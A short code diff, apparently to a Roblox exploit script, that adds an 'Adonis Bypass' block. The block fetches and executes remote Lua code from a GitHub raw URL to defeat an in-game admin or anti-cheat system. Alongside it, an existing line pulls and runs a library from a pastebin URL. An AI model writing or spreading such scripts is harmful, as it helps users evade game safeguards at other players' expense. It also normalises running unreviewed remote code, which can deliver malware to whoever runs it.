@@ -1,3 +1,9 @@
+
+----Adonis Bypass
+print("bypassing adonis")
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Pixeluted/adoniscries/refs/heads/main/Source.lua"))()
+
+
 COREGUI = game:GetService("CoreGui")
 PARENT = nil
 local Lib = loadstring(game:HttpGet("https://pastebin.com/raw/AEzBp2zj"))()
